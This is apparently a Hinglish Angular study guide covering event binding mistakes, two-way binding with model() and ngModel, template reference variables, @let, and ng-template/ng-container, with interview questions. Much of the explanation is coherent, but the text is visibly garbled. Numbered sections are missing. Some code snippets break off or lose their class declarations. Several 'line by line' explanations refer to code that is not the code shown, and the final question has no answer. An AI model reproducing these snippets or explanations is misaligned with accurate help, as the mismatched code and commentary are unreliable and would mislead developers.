11. Common Mistakes

Galtiyan
  • $any($event.target).value ka overuse — template ka as any. Template ref variable (#box) ya typed handler use karo.
  • Event handler mein bhaari kaam (filter, sort, layout read) — main thread block. Handler chhota, kaam service/computed mein.
  • (click) ke saath keyboard support bhoolna — <div (click)> keyboard users ke liye dead hai. Native <button> use karo (Ch4 S2), ya (keydown.enter)/(keydown.space) + role/tabindex.
  • High-frequency events zone app mein bina mitigation ke.
  • (document:click) har component instance pe (dropdown, tooltip) — 500 instances = 500 document listeners. Shared service + ek listener.
  • stopPropagation() ka casual use — dusre components ke listeners (outside-click detection) toot jaate hain. Sirf jab sach mein chahiye.
  • Component output ka naam native event se clash (click naam ka output) — native event shadow ho jaata hai.

  • Key modifiers use karo (keydown.enter), manual e.key checks nahi.

13. Performance

Listener registration creation-time pe ek baar hoti hai — sasti. Asli cost event fire hone pe hai:

  • Zone apps: har event = ek tick() = poore tree ki CD. eventCoalescing: true per-frame merge karta hai (default off hai, historically compat ke liye).
  • Zoneless: event ka koi implicit CD cost nahi. Sirf signal writes CD schedule karti hain, aur wo microtask/frame mein coalesced hoti hain.
  • Listener count: 10,000 rows × 3 listeners = 30,000 listeners (memory + registration time). Solution: parent pe ek listener + event delegation ($event.target se row nikalo), ya rows ko component na banao.

Passive listeners (touchstart, wheel) ke liye Angular template syntax se options pass nahi hote — Renderer2.listen bhi options nahi leta. Zaroorat ho toh addEventListener(..., {passive: true}) zone ke bahar.

S-06

Two-way Binding

Covers: [(x)] ka desugaring · xChange convention · model() & ModelSignal · ngModel · Custom two-way · Re-entrancy & ExpressionChanged

1. What is it?

Two-way binding = [(value)]="x" — "banana in a box". Ye pure syntax sugar hai, koi naya mechanism nahi:

[(value)]="x"
// ═══ desugars to ═══
[value]="x" (valueChange)="x = $event"
// (agar x signal hai: (valueChange)="x.set($event)")

Bas. Ek property binding + ek event binding, ek naming convention (xChange) ke saath. Poora "two-way magic" ye hai.

2. Why do we need it?

Kuch state sach mein do-tarfa hoti hai: form field ki value parent ki state hai, par child (input) hi use badalta hai. Har baar [value]="x" (valueChange)="x.set($event)" likhna repetitive hai. Angular ne is common pattern ko ek syntax de diya — aur uska desugaring public knowledge rakha, taaki koi ise magic na samjhe.

3. What problem does it solve?

  • Boilerplate → ek line mein bind + listen.
  • Form controls → ngModel, custom inputs, sliders, toggles.
  • API consistency → model() se child ko ek hi writable signal, do declarations nahi.

4. Internal Working — model() ka anatomy

// Child
export class CounterComponent {
  count = model(0);          // ModelSignal<number>
}

// model() internally = input + output ka jodaa:
//   input:  'count'         (parent se value aati hai)
//   output: 'countChange'   (child set kare toh emit hota hai)

this.count();              // read (signal)
this.count.set(5);         // write --> local value update + countChange.emit(5)
this.count.update(c => c+1); // same
  InputSignal<T>   = read-only signal + Angular ka internal setter   (Ch4 S5)
  ModelSignal<T>   = InputSignal + PUBLIC set/update + implicit output

  Data flow:
    Parent state --[value]--> ModelSignal (Angular ka internal setter)
    Child .set() --> local value update --> countChange.emit()
                                              |
                                              v
                                    Parent ka handler: x.set($event)
                                              |
                                              v
                                    Parent state badli --> CD --> [value] wapas aaya
                                              |
                                              v
                                    Object.is check: same? --> koi update nahi. LOOP RUKA.

Wo aakhri step critical hai: loop Object.is comparison se rukta hai. Isliye mutable objects ke saath two-way binding khatarnaak hai — reference wahi rahe toh update aata hi nahi, ya har baar naya reference bane toh loop chal sakta hai.

5. Execution Flow — ngModel ka desugaring

<input [(ngModel)]="name" />
// ═══ desugars ═══
<input [ngModel]="name" (ngModelChange)="name = $event" />

// NgModel directive andar se:
//   - ControlValueAccessor (DefaultValueAccessor) se native input se jud-ta hai
//   - input event pe --> onChange() --> ngModelChange.emit(value)
//   - [ngModel] input badle --> writeValue() --> native input.value set
//   - Aur ye ASYNC hai! ngModel value ko ek microtask mein set karta hai
//     (resolvedPromise.then(...)) — historical, ExpressionChanged se bachne ko.
  Kaunsa two-way kab:

  [(ngModel)]        --> Template-driven forms. Legacy. Naye code mein avoid.
  [(value)] + model() --> Custom components. Modern default.
  Reactive forms      --> [formControl] / formControlName — koi two-way binding NAHI.
                          (FormControl khud state ka owner hai; ye better architecture hai)

  ► Reactive forms mein two-way binding ki zaroorat hi nahi padti —
    ye ek achha signal hai ki two-way aksar "state ownership" ki problem chhupata hai.

// Parent intercept karke value transform kar raha hai
export class ParentComponent {
  name = signal('');

  }

<app-input [name]="name()" (nameChange)="onNameChange($event)" />

// Child

  name = model('');
  onType(v: string) { this.name.set(v); }        // L2
}

// Flow: user types "a"
//   L2: name.set('a') --> emit('a')
//   L1: parent.name.set('A')
//   --> child ka [name] input = 'A'
//   --> ModelSignal internal setter: Object.is('a', 'A')? NAHI --> update
//   --> kya child dobara emit karega? NAHI! Internal setter emit nahi karta.  // L3
//       (sirf child ka .set() emit karta hai)
//   --> LOOP RUKA. ✅

// ❌ Lekin agar child effect() se react kare:
constructor() {
  effect(() => {
    const v = this.name();
    if (v !== v.trim()) this.name.set(v.trim());     // L4: INFINITE LOOP ka rasta
  });
}

10. Code Explanation — Line by Line

  • L1–L2: Do writers ek value pe: child (typing) aur parent (uppercase transform). Classic two-way scenario.
  • L3: Yahi model() ka sabse important internal detail hai: parent se aayi value child ka output emit nahi karti. Sirf child ka apna .set()/.update() emit karta hai. Isliye ping-pong loop naturally nahi banta. (Aur upar se Object.is guard bhi hai.) Agar ye na hota toh har two-way binding infinite loop hoti.
  • L4: Yahan tumne loop khud banaya: effect signal ko padhta hai aur likhta bhi hai. Angular ise detect karke error deta hai (dev mode mein), par design galat hai. Transformation ka sahi ghar: value set karte waqt (child ka onType), ya computed() (derived value), ya input() ka transform (Ch4 S5). Effect kabhi apni hi dependency ko mat likho.
  • Broader lesson: two-way binding ka har bug "do writers, ek value" se aata hai. Agar transformation, validation, ya optimistic update chahiye — toh state ka ek clear owner chahiye, aur two-way binding wo ownership chhupa deti hai. Isliye reactive forms mein two-way hai hi nahi.

11. Common Mistakes

Galtiyan
  • Business/domain state pe two-way binding — "kaun badal raha hai" trace karna namumkin. Explicit [data] + (action).
  • Object ke saath two-way + mutation — reference wahi, parent ko pata nahi (OnPush mein toh bilkul nahi).
  • Output ka naam convention se hatna: value + onValueChange → [(value)] kaam nahi karega. Naam exactly valueChange hona chahiye.
  • effect() mein wahi signal likhna jo padha — infinite loop.
  • [(ngModel)] reactive forms ke saath mix karna — deprecated pattern, warnings aati hain.
  • Two-way binding ko "kam code" ke liye use karna jab actually interception chahiye tha — phir desugared form pe wapas aana padta hai.

12. Best Practices

Production rules
  • Two-way sirf simple, scalar, UI-owned values pe: quantity, checked, value, expanded.
  • Custom components mein model() use karo — do declarations (input+output) manually mat likho.
  • Objects/arrays pe two-way se bacho; agar zaroori ho toh immutable updates (Ch1 S4).
  • Interception chahiye? Desugared form likho — [x] + (xChange)="handler($event)".
  • Forms: reactive forms (koi two-way nahi). ngModel legacy hai.
  • Transformation ka ghar: child ka setter, input transform, ya computed — kabhi effect nahi.

13. Performance

Two-way = ek property binding + ek event binding, toh cost bhi wahi (S2 + S5). Ek extra consideration: har child-side .set() ek output emit karta hai (synchronous, Ch4 S6), parent ka handler chalta hai, parent ka state badalta hai, aur agla CD cycle input wapas set karta hai. Yaani ek user keystroke pe do value writes hote hain (child local + parent-driven), aur ek extra comparison.

Scalar values pe ye noise hai. Bade objects pe (poora form model) har keystroke pe naya object + child ka poora subtree dirty = measurable. Isliye large form models ke liye reactive forms (jahan har control apni value ka owner hai) architecturally tez bhi hain.

14. Edge Cases

  • [(x)] mein x ek expression nahi ho sakta jo assignable na ho: [(value)]="a.b" theek, [(value)]="getX()" nahi.
  • Signal ke saath: [(value)]="mySignal" — Angular mySignal.set($event) khud call karta hai (special-cased). Non-signal field pe x = $event.
  • model() ka alias: model(0, {alias: 'count'}) → output countChange ban jaata hai.
  • ngModel value ko microtask mein set karta hai (historical ExpressionChangedAfterItHasBeenChecked avoidance) — isliye ngModelChange ke turant baad value padhna stale ho sakta hai.
  • Do-tarfa binding @if ke andar ke component pe — component destroy/recreate pe parent state survive karti hai (state parent ke paas hai) — ye actually two-way ka ek faayda hai.
  • model() ka signal parent ko dikhta nahi — parent sirf value aur event dekhta hai. Child ka signal child ka hai.

MEDIUM Two-way binding infinite loop kyun nahi banti?

Do guards hain. (1) Parent se aayi value output emit nahi karti — ModelSignal ka internal setter (jo Angular binding update pe call karta hai) sirf value set karta hai; emit sirf child ke apne .set()/.update() se hota hai. (2) Object.is comparison — value same hui toh binding update hi nahi hoti. Loop tab banta hai jab tum khud banao: jaise effect() mein wahi signal padhna aur likhna, ya parent ka handler har baar naya object banaye.

MEDIUM Two-way binding kab use nahi karna chahiye?

Jab state ka ownership ambiguous ho jaaye: business/domain objects (order, user), jahan validation, optimistic updates, undo, ya audit ("kisne badla") chahiye. Objects/arrays pe bhi khatarnaak (mutation invisible, OnPush toot-ta hai). Sahi jagah: simple scalar UI values (quantity, checked, expanded, slider value). Ek achha signal: reactive forms mein two-way binding hai hi nahi, kyunki FormControl khud value ka owner hai — aur wo architecture behtar hai.

HARD ModelSignal aur InputSignal ka type-level aur runtime farak batao.

Type level: InputSignal<T> ek read-only Signal<T> hai — uske type mein set/update declare hi nahi, isliye component code use badal nahi sakta (Ch4 S5). ModelSignal<T> WritableSignal<T>-jaisa hai — set/update public hain. Runtime: dono ke paas ek internal "apply value from binding" path hai jise Angular binding update pe call karta hai; farak ye hai ki ModelSignal ke public set/update ek OutputEmitterRef (xChange) ko emit bhi karte hain, jabki internal binding-driven update emit nahi karta (warna har parent-driven change wapas parent ko echo hoti aur loop banta). Compiled definition mein model() ek input aur ek output dono register karta hai (δcmp.inputs + δcmp.outputs). Design insight: ek hi underlying signal object ke do "views" hain — Angular ke liye writable (binding se), consumer component ke liye writable (set se, emit ke saath), aur parent ke liye ye sirf ek input + ek output dikhta hai. Ye Ch2 ka structural typing + API design ka sundar use hai: type system se hi galat use rok diya gaya.

SCENARIO Ek <app-date-range-picker [(range)]="filters().dateRange" /> hai. Team shikayat kar rahi hai: kabhi value update nahi hoti, kabhi do baar API call hoti hai, aur undo feature nahi ban pa raha. Diagnose + redesign.

Teeno symptoms ek hi root cause ke hain: two-way binding ne state ownership chhupa di. (1) "Value update nahi hoti" — range ek object hai ({from, to}). Child ne range().from = newDate (mutation) kiya toh reference wahi raha; parent ka OnPush component update nahi hua, aur Object.is guard ki wajah se binding bhi kuch nahi karti. Fix: immutable updates (this.range.set({...this.range(), from})) — par ye sirf symptom hai. (2) "Do baar API call" — parent ka handler (ya effect) range change pe fetch karta hai; child from aur to alag-alag set karta hai (do emits) → do fetches, aur beech mein ek invalid state (from > to). Ye two-way ka structural problem hai: atomic transaction ka koi concept nahi. (3) "Undo nahi ban raha" — kyunki state kahan hai? Parent ke paas value hai, par change ka intent (kaunsa field, kis wajah se) kabhi record nahi hota. Undo ke liye intent chahiye, sirf final value nahi. Redesign: two-way hataao. Child ka contract: range = input.required<DateRange>() (read-only) aur rangeSelected = output<DateRange>() — child apni draft state andar rakhe (dono dates chuni jaayein tab tak), aur ek hi baar complete, valid range emit kare. Parent ek jagah state badalta hai (filters.update(...)), wahin se fetch trigger hota hai (resource() params se, auto-cancel ke saath), aur wahin undo stack maintain ho sakti hai. Fayde: ek emit = ek fetch; invalid intermediate state kabhi parent tak nahi aati; "kisne badla" hamesha clear (ek handler); undo/redo/URL-sync (Ch4 S9: ye state navigable hai, URL mein honi chahiye!) sab possible. General rule jo bolna hai: two-way binding ek UI convenience hai, state architecture nahi. Jaise hi validation, atomicity, ya history ki zaroorat aaye — desugar karo aur explicit intent bhejo.

1. What is it?

Template reference variable = #name — template ke andar kisi cheez ko naam dena, taaki usi template mein baad mein use kar sako. <input #box> ke baad box.value likha ja sakta hai.

Wo "cheez" teen mein se ek hoti hai, aur kaunsi ye ek precise resolution rule se decide hota hai — jo interview mein bahut poocha jaata hai.

2. Why do we need it?

Kabhi-kabhi template ko apne hi elements ka reference chahiye — ek input ki value padhni hai, ek video ko play karna hai, ek form ki validity dikhani hai. Bina refs ke ye sab component class se hota (queries + viewChild, Ch4 S7), jo chhote cases ke liye bhaari hai. Refs template ko self-contained rakhte hain: <input #box (keyup.enter)="search(box.value)"> — koi component field, koi query, koi cast.

3. What problem does it solve?

  • Simple DOM access → bina component class ko chhue.
  • $event.target ka casting → ref se typed element milta hai.
  • Directive instance access → #f="ngForm", #m="matMenu".
  • Template ko parameter banana → #tpl se TemplateRef (S8).

4. Internal Working — resolution rules

  <X #ref>  ka value kya hoga? Teen rules, is order mein:

  1. #ref="someExportAs"  likha hai?
        --> us element pe lagi directive/component jiska exportAs === 'someExportAs'
        --> uska INSTANCE milega
        (nahi mila --> compile error: "No directive found with exportAs")

  2. X ek COMPONENT hai (ya ng-template)?
        --> component ka INSTANCE          (ng-template --> TemplateRef)

  3. Warna:
        --> ElementRef ka nativeElement    (yaani HTMLInputElement, HTMLDivElement...)

  Examples:
    <input #box>                    --> HTMLInputElement
    <app-card #c>                   --> CardComponent instance
    <app-card #c="orderCard">       --> jis directive/component ka exportAs='orderCard'

5. Execution Flow — scope rules (yahan log fasste hain)

  Ek ref apne "template" (view) ke andar HAR JAGAH visible hai —
  declaration ke PEHLE bhi, kyunki refs compile-time pe resolve hote hain.

    <button (click)="box.focus()">Focus</button>    <-- box neeche declare hua, phir bhi ✅
    <input #box>

  LEKIN embedded views (ng-template, @if, @for) BOUNDARIES banati hain:

    @if (show()) {
      <input #box>              <-- box IS embedded view ka hai
    }
    <button (click)="box.focus()">   <-- ❌ COMPILE ERROR: box nahi dikhega

  Ulta chalta hai (outer --> inner):

    <input #box>
    @if (show()) {
      <button (click)="box.focus()">   <-- ✅ outer ref inner view mein visible
    }

  ► Rule: ref apne view + uske nested views mein visible hai. Bahar nahi.
  ► @for ke andar har iteration ka apna ref hota hai (alag embedded view).

6. Architecture — @let (v18+), refs ka naya cousin

// Purana dard: ek value ko template mein kai jagah use karna
@if (user(); as u) { ... }           // sirf @if ke saath
<div *ngIf="x$ | async as x">            // hack: ngIf sirf alias ke liye

// Naya: @let — template ka local variable
@let total = order().amount + order().tax;             // L1
@let user = userResource.value();
@let greeting = 'Hello ' + user?.name;

<p>{{ total | currency:'INR' }}</p>
<p>{{ greeting }}</p>

// Rules:
//   - read-only (assign nahi kar sakte)
//   - declaration ke BAAD hi use ho sakta hai (refs se ulta!)
//   - apne view + nested views mein visible
//   - har CD cycle mein re-evaluate (memoized nahi — computed() nahi hai!)

Trap: @let ek convenience hai, computed() ka replacement nahi. Wo har CD cycle mein re-evaluate hota hai. Bhaari computation computed() mein rakho; @let sirf readability ke liye (repeated sub-expression ko naam dena).

10. Code Explanation — Line by Line

  • L1: let-row (bina value ke) ka matlab hai: context object ki $implicit property. Ye "default parameter" hai. let-i="index" named property se bind karta hai. Yaani ng-template ek function jaisa hai jiske arguments ek object se aate hain.
  • L2: ngTemplateOutletContext hi wo "arguments object" hai. @for internally yahi karta hai — har iteration ke liye ek embedded view banata hai {$implicit: item, index, first, last, even, odd, count} context ke saath.
  • L3: $implicit naam by convention hai — agar tum let-row likhte ho toh Angular $implicit uthata hai, chahe uska naam kuch bhi ho. Isliye @for mein tum item ko koi bhi naam de sakte ho.
  • L4: ngTemplateContextGuard — ek static type-guard method jo compiler ko batata hai ki is directive ke saath template ka context kya type hai. Iske bina let-row ka type any hota hai (silent any, Ch2 S1 ka zeher). Iske saath strictTemplates row.nmae pakad leta hai. Ye wo detail hai jo library-quality components ko app-quality se alag karti hai — aur interview mein bolne pe instant depth signal.

11. Common Mistakes

Galtiyan
  • Embedded view (@if/@for) ke andar ka ref bahar use karna — compile error, aur log ise "Angular bug" samajhte hain.
  • <app-card #c> se element expect karna — component element pe ho toh ref component instance deta hai, ElementRef nahi. ElementRef chahiye toh viewChild('c', {read: ElementRef}) (Ch4 S7).
  • #c="somethingWrong" — exportAs match na kare toh compile error.
  • Ref se child component ki internal state padhna/badalna — encapsulation violation (Ch4 S9). Imperative APIs ke liye hi.
  • @let ko computed() samajhna — har CD cycle mein re-evaluate hota hai, memoized nahi.
  • let-row ka type any reh jaana — ngTemplateContextGuard likho.
  • Ref ka naam component field se clash — template mein ref jeetta hai (shadowing), silent confusion.

12. Best Practices

Production rules
  • $event.target casting ki jagah template ref variable (typed, saaf).
  • Component ka imperative API expose karna ho toh exportAs + documented public methods.
  • Refs sirf template-local kaam ke liye; component class se access chahiye toh viewChild().
  • @let = readability (repeated sub-expression). Heavy computation = computed().
  • Custom structural directives mein hamesha ngTemplateContextGuard.
  • Ref names descriptive (#searchInput, not #i) — wo template ka public naam hai.

13. Performance

Refs compile-time construct hain — δδreference(idx) se LView slot se value uthayi jaati hai. Runtime cost practically zero (ek array index).

@let ka cost: uska expression har CD cycle mein evaluate hota hai (ek binding slot ke saath — value cache hoti hai comparison ke liye, par expression phir bhi chalta hai). Toh @let heavy = expensiveCalc() utna hi bura hai jitna {{ expensiveCalc() }} (S1). Difference sirf itna hai ki wo ek jagah likha hai.

let- context variables: har embedded view ka apna context object hai (@for mein per-item). Ye memory hai — 10,000 items = 10,000 context objects. Ek aur reason ki bade lists virtualize karo.

14. Edge Cases

  • Ek element pe kai refs: <input #a #b> — dono same element ko point karte hain (legal, useless).
  • <app-card #el #cmp="orderCard"> — #el component instance dega (rule 2!), ElementRef nahi. Element chahiye toh query se.
  • Ref name aur component property ka clash: template mein ref shadow karta hai. Naming discipline se bacho.
  • <ng-container #c> — ng-container ka koi DOM element nahi (S8), toh ref se kuch meaningful nahi milta.
  • @for ke andar declare kiya ref har iteration mein alag hai (alag embedded view) — viewChildren('ref') se sab mil jaate hain.
  • @let shadowing: ek @let outer scope ke @let ko shadow kar sakta hai nested view mein; par same view mein redeclare = error.
  • #ref ka value first matching rule se aata hai — exportAs hamesha jeetta hai.

15. Interview Questions

EASY <input #box> se kya milta hai?

HTMLInputElement — kyunki us element pe koi component/directive nahi hai (aur koi exportAs specify nahi kiya). Template mein box.value, box.focus() sab typed mil jaate hain (strictTemplates ke saath). Ye $any($event.target).value se behtar hai.

EASY #f="ngForm" ka matlab?

exportAs syntax — us element pe lagi wo directive do jiska exportAs: 'ngForm' hai (yani NgForm directive ka instance). Bina ="ngForm" ke #f element (HTMLFormElement) deta. exportAs hi wo mechanism hai jisse library components apna instance template mein expose karte hain (ngModel, matMenu, routerLinkActive).

MEDIUM Template reference variable ka scope kya hai?

Apne view (template) mein har jagah — declaration se pehle bhi, kyunki resolution compile-time pe hoti hai. Aur nested embedded views mein bhi (outer → inner visible). Par ulta nahi: @if/@for/ng-template ke andar declare kiya ref bahar visible nahi hai — wo alag embedded view hai. @for mein har iteration ka apna ref instance hota hai.

MEDIUM #ref ka value kaise decide hota hai — teen rules?

Order mein: (1) #ref="exportAsName" diya hai toh us exportAs wali directive/component ka instance; (2) element pe component hai toh uska instance (aur ng-template pe TemplateRef); (3) warna native element (ElementRef.nativeElement). Isliye <app-card #c> component instance deta hai, element nahi — ElementRef chahiye toh viewChild('c', {read: ElementRef}).

HARD let-row ka type any kyun hota hai, aur ngTemplateContextGuard kya karta hai?

ng-template ka context ek runtime object hai jo ngTemplateOutletContext (ya structural directive) se aata hai — compiler ko uska type kahin se nahi pata. Isliye let-row ka type any ho jaata hai, aur row.nmae jaisa typo silently pass ho jaata hai (silent any, Ch2 S1). ngTemplateContextGuard ek static method hai directive pe: static ngTemplateContextGuard<T>(dir: MyDir<T>, ctx: unknown): ctx is MyContext<T>. Ye ek TypeScript type predicate (Ch2 S1 narrowing) hai — ngtsc Type Check Block generate karte waqt (Ch3 S5) ise call karta hai, jisse template ke andar let- variables ka exact type mil jaata hai, aur wo directive ke generic parameter se derive ho sakta hai. Angular ka apna NgFor yahi karta hai (isliye *ngFor="let item of items" mein item typed hai), aur ab @for mein toh compiler directly janta hai. Practical takeaway: koi bhi custom structural directive ya template-outlet API bina context guard ke type-unsafe hai — aur ye ek line ka fix hai jo library-quality ka nishaan hai.

SCENARIO Ek reusable <app-data-table> chahiye jisme consumer per-column cell template de sake, aur wo template type-safe ho (let-row pe autocomplete + typo detection). Design karo.

(1) Template collection: ek marker directive banao — @Directive({selector: '[appCellDef]'}) jiska input column key le (appCellDef = input.required<string>()) aur jo apna TemplateRef inject kare (private tpl = inject(TemplateRef)). Table contentChildren(CellDefDirective) (Ch4 S7) se sab collect kare aur ek computed(() => new Map(defs().map(d => [d.key(), d.tpl]))) banaye. (2) Rendering: <ng-container [ngTemplateOutlet]="tplFor(col)" [ngTemplateOutletContext]="{$implicit: row, row, index: i, column: col}" />. Fallback: template na mile toh default cell ({{ row[col.field] }}). (3) Type safety — asli kaam: directive ko generic banao (CellDefDirective<T>) aur static ngTemplateContextGuard<T>(dir: CellDefDirective<T>, ctx: unknown): ctx is {$implicit: T; row: T; index: number; column: ColumnDef<T>} likho. Ab let-row ka type T hai. Par T infer kahan se ho? Trick: directive pe ek dummy input do jo table ke rows ka type carry kare (appCellDefTypeOf = input<T[]>()) — consumer [appCellDefTypeOf]="rows" likhe. Ye Angular CDK ka actual pattern hai. (4) Column typing: Ch2 S6 ka ColumnDef<T, K extends keyof T> + factory function se per-column precision. (5) Performance: har custom cell ek embedded view = ek LView (Ch3 S6); 20,000 cells pe ye bhaari hai — default rendering (plain interpolation, koi template nahi) rakho aur templates sirf custom columns ke liye. Aur virtualization. (6) Alternative jo bolna chahiye: content projection (ng-content, S9) yahan kaam nahi karega kyunki per-row context pass nahi hota — projection parent ke context mein evaluate hota hai. Yahi ng-template vs ng-content ka decisive farak hai. Ye answer refs + context guards + generics + projection ki limits — sab jodta hai.

S-08

ng-template & ng-container

Covers: Structural directive desugaring · TemplateRef / ViewContainerRef / EmbeddedViewRef · ngTemplateOutlet + context · ng-container as anchor · Custom structural directives

1. What is it?

Do "invisible" elements jo DOM mein kabhi nahi jaate, par bilkul alag kaam karte hain:

  • <ng-template> — ek blueprint. Uska content render nahi hota jab tak koi explicitly na kare. Wo ek TemplateRef ban jaata hai — ek "view factory".
  • <ng-container> — ek grouping wrapper. Uska content turant render hota hai, bas koi extra DOM node nahi banta.

Ek jagah leta hai par dikhta nahi (ng-container); doosra dikhta hai par sirf tab jab koi use render kare (ng-template).

2. Why do we need it?

ng-container ki zaroorat HTML ki grammar se aati hai: <tr> ke andar <div> invalid hai, <select> ke andar bhi. Structural directive ya grouping ke liye ek "koi element nahi" wala element chahiye tha.

ng-template ki zaroorat gehri hai: Angular ka poora conditional rendering aur content customization system isi pe khada hai. *ngIf, @if, @for, @defer — sab andar se ng-template hain. Aur ye "template as a value" concept React ke render props ka Angular equivalent hai.

3. What problem does it solve?

  • Extra wrapper divs → ng-container se grouping bina DOM node ke.
  • Lazy/conditional content → ng-template render on demand.
  • Component customization → consumer template pass kare, component decide kare kab/kitni baar render ho.
  • Structural directives → * syntax ka poora foundation.

5. Execution Flow — apni structural directive

@Directive({ selector: '[appIfRole]' })
export class IfRoleDirective {
  private tpl = inject<TemplateRef<void>>(TemplateRef);      // L1: blueprint
  private vcr = inject(ViewContainerRef);                     // L2: anchor
  private auth = inject(AuthService);

  role = input.required<Role>({ alias: 'appIfRole' });          // L3

  constructor() {
    effect(() => {                                            // L4
      const allowed = this.auth.hasRole(this.role());
      this.vcr.clear();                                       // L5
      if (allowed) this.vcr.createEmbeddedView(this.tpl);      // L6
    });
  }
}

// Usage:

6. Architecture — ngTemplateOutlet (render props pattern)

// Component customizable banao — consumer template deta hai
@Component({
  selector: 'app-list',
  imports: [NgTemplateOutlet],
  template: `
    @for (item of items(); track item.id; let i = $index) {
      <ng-container
        [ngTemplateOutlet]="itemTemplate() ?? defaultTpl"
        [ngTemplateOutletContext]="{ $implicit: item, index: i }" />
    } @empty {
      <ng-container [ngTemplateOutlet]="emptyTemplate() ?? defaultEmpty" />
    }

    <ng-template #defaultTpl let-item><li>{{ item.name }}</li></ng-template>
    <ng-template #defaultEmpty><p>Empty</p></ng-template>
  `,
})
export class ListComponent<T extends {id: string; name: string}> {
  items = input.required<readonly T[]>();
  itemTemplate = input<TemplateRef<{ $implicit: T; index: number }>>();
  emptyTemplate = input<TemplateRef<void>>();
}

// Consumer:

<ng-template #row let-order let-i="index">

</ng-template>

10. Code Explanation — Line by Line

  • L1: *ngIf ek asli directive hai. Har use pe: ek instance, ek LView slot, ek ElementInjector entry (kyunki wo TemplateRef/ViewContainerRef inject karta hai, Ch3 S9), aur ek input-setter chain. 1000 rows × 2 *ngIf = 2000 directive instances.
  • L2: @if mein compiler ek anchor comment node aur ek template function banata hai — koi directive class involved nahi.
  • L3: δδconditional(index) — ek hi instruction jo batati hai kaunsa branch active hai (-1 = koi nahi). Andar wo purana view destroy karke naya create karti hai (ya kuch nahi karti agar branch same hai). @else if chain ek hi instruction mein handle hoti hai — *ngIf; else ke template-ref jugaad ki zaroorat nahi.
  • Iska matlab: naye control flow blocks sirf "acchi syntax" nahi hain — wo ek poori abstraction layer (directive + injector + differ) hata dete hain. Isliye wo tez hain, bundle chhota karte hain, aur locality (Ch3 S1) ke saath better fit hain. Angular ne ise ek compiler feature banaya, library feature nahi — yahi difference hai.
  • Aur ek bonus: @if mein type narrowing (@if (user(); as u)) compiler ko directly pata hai; *ngIf mein wo NgIf ke ngTemplateContextGuard + ngTemplateGuard_ngIf static properties se aati thi (S7 ka concept, framework ke andar).

11. Common Mistakes

Galtiyan
  • <ng-template> mein content likh ke expect karna ki wo dikhega — koi use nahi karega toh kabhi nahi dikhega.
  • *ngIf ko "hide/show" samajhna — wo view destroy karta hai (component state, subscriptions, DOM sab). Sirf visually chhupana ho toh [hidden] ya CSS.
  • ng-container pe styling/class lagane ki koshish — uska koi element hi nahi hai.
  • Ek element pe do structural directives (*ngIf *ngFor) — compile error. (Naye blocks mein ye problem nahi.)
  • ngTemplateOutlet ke context mein $implicit bhoolna — let-item undefined milega.
  • Custom structural directive mein vcr.clear() bina condition check ke har change pe — view destroy+recreate, state loss.
  • ng-template pe @if lagana ye samajh ke ki content lazy ho jaayega — ng-template already lazy hai.

12. Best Practices

Production rules
  • Naye code mein @if/@for/@switch — *ngIf/*ngFor legacy.
  • ng-container se wrapper divs se bacho (DOM node count = memory + CD cost).
  • Customizable components: ng-template + ngTemplateOutlet (per-item context chahiye) vs ng-content (static slot).
  • Custom structural directives mein ngTemplateContextGuard (S7) aur ngTemplateGuard_* (narrowing ke liye).
  • Templates ko input<TemplateRef<Ctx>>() se typed rakho, TemplateRef<any> nahi.
  • ViewContainerRef se banayi views ka cleanup — DestroyRef ya explicit destroy().

13. Performance

Embedded views mehengi hain. Har createEmbeddedView ek naya LView array + DOM nodes + CD tree node banata hai (Ch3 S6). 10,000 items ka @for = 10,000 embedded views. Isliye:

  • track sahi rakho (Ch3 S6) — warna reorder pe sab destroy+create.
  • Per-cell templates (ngTemplateOutlet har cell pe) bade grids mein bhaari — default rendering use karo, template sirf custom columns pe.
  • *ngIf vs @if: *ngIf mein extra directive instance + injector per use.
  • ng-container sasta hai (ek comment anchor), <div> ek asli DOM node — bade lists mein farak dikhta hai.

Aur yaad rakho: @if false hone pe DOM hi nahi banta (CSS display:none se ulta) — ye initial render ke liye bada win hai, par toggle-heavy UI mein destroy/create ka cost hota hai. Frequently toggling content ke liye CSS hiding better ho sakti hai (state preserve bhi hoti hai).

14. Edge Cases

  • ng-container pe structural directive lag sakti hai (<ng-container *ngIf>) — kyunki desugaring mein wo ng-template ban jaata hai.
  • <ng-template> pe do structural directives bhi nahi lag sakti (same rule).
  • vcr.createEmbeddedView(tpl, ctx, {index: 0}) — position control; move() se reorder (yahi @for ka keep/move algorithm karta hai).
  • EmbeddedViewRef.context mutable hai — @for update pe Angular context object ko mutate karta hai (naya nahi banata), isliye $index reactive lagta hai.
  • TemplateRef ko viewChild(TemplateRef) se bhi mil sakta hai, ya #tpl ref se (S7).
  • ngTemplateOutlet ka value null ho toh kuch render nahi hota (crash nahi).
  • Structural directive ke ngTemplateGuard_input static property se type narrowing hoti hai — *ngIf="user as u" mein u non-null kaise hua, iska yahi jawab hai.

15. Interview Questions

EASY ng-template aur ng-container mein farak?

ng-container: grouping ke liye invisible wrapper — content turant render hota hai, bas koi DOM node nahi banta. Use: <tr> ke andar wrapper chahiye bina invalid HTML ke. ng-template: ek blueprint — content render nahi hota jab tak koi explicitly na kare (ngTemplateOutlet, structural directive, createEmbeddedView). Ek jagah leta hai par dikhta nahi; doosra dikhta hai par jagah nahi leta.

EASY *ngIf mein asterisk ka kya matlab hai?

* ek shorthand hai: "is element ko ek <ng-template> mein lapet do aur us template pe ye directive laga do". <div *ngIf="x"> desugars hota hai <ng-template [ngIf]="x"><div></div></ng-template> mein. Isliye ek element pe do structural directives nahi lag sakti — do templates ka wrapping ambiguous hoga.

MEDIUM TemplateRef, ViewContainerRef, EmbeddedViewRef — teeno ka role?

TemplateRef = view banane ka blueprint/factory (createEmbeddedView(context)). ViewContainerRef = ek anchor point jahan views insert/remove/move hoti hain (createEmbeddedView, createComponent, clear, move). EmbeddedViewRef = banayi hui view ka handle (destroy, detectChanges, context). *ngIf ka poora kaam: TemplateRef aur ViewContainerRef inject karo, condition true pe view banao, false pe clear(). Ye teeno milke Angular ka dynamic view system hain.

MEDIUM Customizable list component ke liye ng-content lena chahiye ya ng-template?

ng-template. ng-content (projection, S9) mein consumer ka content ek baar banta hai aur parent ke context mein evaluate hota hai — component use per-item data nahi de sakta, aur na hi use N baar render kar sakta hai. ng-template ek factory hai: component ngTemplateOutlet + ngTemplateOutletContext se jitni baar chahe, jis context ke saath chahe, render kar sakta hai. Lists/tables/trees mein sirf yahi kaam karta hai. Static slots (header/footer) ke liye ng-content theek hai.

HARD @if aur *ngIf mein internally kya farak hai — sirf syntax ka?

